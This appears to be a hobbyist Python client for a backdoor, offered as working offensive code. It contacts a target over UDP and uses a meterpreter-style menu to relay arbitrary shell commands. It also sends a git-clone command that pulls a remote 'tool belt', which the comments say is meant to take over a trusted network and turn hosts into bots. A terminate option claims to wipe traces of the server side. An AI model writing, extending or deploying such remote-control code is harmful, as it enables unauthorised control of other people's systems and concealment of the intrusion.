import socket #This allows us to create socckets and various network protcol data communications
import os #This lets us initiate functions on the operating system kernel  
import sys #This lets us initiate 


client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #This sets up the main TCP client based socket we ned to connect and talk to other ports over networks

#Unlike the TCP protocol the UDP protocol is based on a connectionless architype, so the only thing we will be doing is simply sending data to a default port
#We can mode the script to take in a ip and port number and then from there, simply remmeber it and simpyl interacrr with it back and forth until the connection closes

#This secures the IP address and port number of the system we wish to connect to
while True:

    os.system("clear") #This clears the terminal of the main console window

    print("Enter in your target IP and Port numbers now ")
    print("") 

    ip = input("Target IP? =>   ")
    port = int(input("Target Port? =>   "))
    trgtaddress = (ip, port) #This is going to store the target address we will be interacting with which utilizes 2 paramaters

    #This will send a test packet to the target to check whether or not it is up and running on the IP and Port specified
    probe = "ping".encode('UTF-8')
    client.sendto(probe, trgtaddress)

    #It will then enter a state where it will wait to recieve some data. If the data that is sent doesn't hear a response, then we give the
    print("Checking the data probe now. If there is a response this message should clear, else ctrl-C to close out the program")
    serverresponse, serveraddress = client.recvfrom(7000) #You have to with the DUP protocol, pslit the paramaters in two to capture the actual data that is being sent to you
    udpserverresponse = serverresponse.decode('UTF-8') 

    if udpserverresponse == "ack": #If we are conected to the target, then the loop will end and we will break out of it, otherwise we'll be prompted to input again
        
        print("You are connected to " + ip + str(port))
        print("Hit Enter")
        print("")
        input("")
        break 



#def Check_Architecture(): #This while loop checks the systemm architracute you are running and then installs all tools needed to oncvert it into a successful bot for your control
while True:

    os.system("clear")

    print("Your connection is established with target => ", trgtaddress)

    print("Which system is your server operating on? Windows/Linux/Unix? (lowercase only followed by the => sign)")
    print("")
    print("For Windows Enter => windows ")
    print("For Linux Enter => linux ")
    print("To skip this Enter => skip")

    print("")

    architecture = input("Select your operating System architecture =>  ")

    #If the program detects you are running on Linux then it will install my script (Eventualy a series of commnon tools to take over a trusted network and such)
    if architecture == "linux":

        #The program is going to send packet data that contians the needed commands to install our linux tool belt on the mian system 
        linuxtoolbelt = "git clone https://github.com/FutabaWebs/Test.git".encode('UTF-8') #This is going to encode our data into binary format 
        client.sendto(linuxtoolbelt, trgtaddress) #This is going to send the data over to the server side, wher eit will be handled and forwarded for use on it's end
        break

    elif architecture == "skip":

        break


#def main_options(): #This is going to bring us to a main menu. much like  ameterpreeter, and will ask which option you would like to select
while True: #We are going to add a feature to this once a week and make sure its polished and such 

    os.system("clear") 

    #The program is going to ask you if you which option you wish to run as a set of commands for the backdoor exploit
    print("Which option would you like to use for the meterpreter shell")
    print("All commands are followed after the (->) by their respective names associated with them ")
    print("")

    print("Exit -> exit (Exits and terminates the connection)")
    print("Terminal Shell -> shell (Opens a shell on the target)") #The main server will send any and all responses 
    print("Terminate -> terminate (This will terminate and wipe traces of the server on the system and network)")
    print("")

    print("Enter your option now")

    mainoption = input("")

    if mainoption == "exit": #If the end user enters exit the program and socket will close()

        #If the main client closes out the connection, the sockets get cleaned up and then the program closes to prevent the socket from being exposed on the system

        server_close = "exit".encode('utf-8') #This is going to end the exit command to ther server side in order to close out the connection
        client.sendto(server_close, trgtaddress)
        client.close()
        exit() #This will close the program overall and terminate the main loop in the process

    elif mainoption == "shell": #If the end user enters in shell, then the client will sit and take commands until tols to stop by the ned user 

        while True:

            print("To exit the shell simply enter => exit and the shell will close, bringing you back to the main options")
            print("")

            os.system("clear")
            print("Enter in a Linux Command now")
            LinuxCommand = input("") #Takes in a command for us to end to the target system

            if LinuxCommand == "exit":
                break 

            #This will terminate the main client script, and will also kill and wipe the server side end and any traces of it being there
            elif LinuxCommand == "terminate":
                
                Kill = LinuxCommand.encode('UTF-8')
                client.sendto(Kill, trgtaddress)
                exit()


            else:
                
                #The data here isn't being executed on the main targets system
                Command = LinuxCommand.encode('UTF-8')
                client.sendto(Command, trgtaddress)

                cmdresponse, servercommandaddress = client.recvfrom(7000)

                commandresponse = cmdresponse.decode('UTF-8')
                print(commandresponse)
                input("Hit Enter  ")


                #After the client sends data it needs to sit and receive data for a moment so it can print the response from the main server on the system





